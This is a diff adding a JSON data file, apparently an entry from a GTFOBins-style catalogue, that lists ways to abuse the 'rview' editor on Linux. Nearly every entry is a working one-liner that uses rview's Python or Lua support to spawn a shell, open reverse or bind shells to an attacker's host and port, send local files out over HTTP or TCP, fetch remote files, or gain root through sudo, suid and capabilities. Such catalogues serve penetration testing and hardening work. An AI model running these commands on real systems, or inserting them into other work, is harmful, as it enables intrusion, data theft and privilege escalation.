@@ -1,0 +1,100 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.",
+        "code": "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+      },
+      {
+        "description": "This requires that 'rview' is compiled with Lua support.",
+        "code": "rview -c ':lua os.execute(\"reset; exec sh\")'"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Run 'socat file:`tty`,raw,echo=0 tcp-listen:[port]' on the attacker box to receive the shell.",
+        "code": "rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((\"[host]\", [port]))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"
+      }
+    ],
+    "non-interactive-reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.",
+        "code": "rview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\nt:connect(\"[host]\", [port]);\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();'\n"
+      }
+    ],
+    "non-interactive-bind-shell": [
+      {
+        "description": "Run 'nc [host] [port]' on the attacker box to connect to the shell. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.",
+        "code": "rview -c ':lua local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\", [port]));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();'\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
+        "code": "rview -c ':py import vim,sys;\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"[host]\", bytes(u.urlencode({\"d\":open(\"[file]\").read()}).encode()))\nvim.command(\":q!\")'\n"
+      },
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Serve files in the local folder running an HTTP server.",
+        "code": "rview -c ':py import vim,sys;\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", [port]), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"
+      },
+      {
+        "description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.",
+        "code": "rview -c ':lua local f=io.open(\"[file]\", \"rb\")\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(\"[host]\", [port]);\nt:send(d);\nt:close();'\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Fetch a remote file via HTTP GET request.",
+        "code": "rview -c ':py import vim,sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"[host]\", \"[file]\")\nvim.command(\":q!\")'\n"
+      },
+      {
+        "description": "Fetch a remote file via TCP. Run 'nc [host] [port] < [file]' on the attacker box to send the file. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.",
+        "code": "rview -c ':lua local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\", [port]));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(\"LFILE\", \"wb\");\nf:write(d);\nio.close(f);'\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "rview [file]\niDATA\n^[\nw!\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "rview [file]"
+      }
+    ],
+    "library-load": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.",
+        "code": "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
+      }
+    ],
+    "suid": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.",
+        "code": "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.",
+        "code": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+      },
+      {
+        "description": "This requires that 'rview' is compiled with Lua support.",
+        "code": "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
+      }
+    ],
+    "capabilities": [
+      {
+        "description": "This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.",
+        "code": "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "This requires that 'rview' is compiled with Lua support.",
+        "code": "./rview -c ':lua os.execute(\"reset; exec sh\")'"
+      }
+    ]
+  }
+}
